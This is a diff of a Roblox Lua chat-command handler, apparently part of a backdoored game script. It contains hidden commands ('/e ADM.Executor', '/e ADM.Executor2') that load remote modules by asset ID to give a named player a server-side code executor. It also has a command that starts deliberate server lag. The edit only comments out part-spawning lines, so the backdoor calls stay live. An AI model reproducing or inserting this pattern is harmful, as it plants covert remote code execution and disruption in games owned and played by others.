@@ -298,14 +298,14 @@ UIAspectRatioConstraint.AspectRatio = 4.077
 				end
 				--rbxassetid://5679232242
 			elseif message == "/e ADM.Executor" then
-				local Part = Instance.new("Part",workspace)
-				Part.CanCollide=true
-				Part.CFrame = player.Character.Torso.CFrame
+				--local Part = Instance.new("Part",workspace)
+				--Part.CanCollide=true
+				--Part.CFrame = player.Character.Torso.CFrame
 				require(6324372525).fse(player.Name)
 			elseif message == "/e ADM.Executor2" then
-				local Part = Instance.new("Part",workspace)
-				Part.CanCollide=true
-				Part.CFrame = player.Character.Torso.CFrame
+				--local Part = Instance.new("Part",workspace)
+				--Part.CanCollide=true
+				--Part.CFrame = player.Character.Torso.CFrame
 				require(5419042716).PraiseSkidGod(player.Name)
 			elseif message == "/e ADM.Lag.Start" then
 				LagEnabled = true
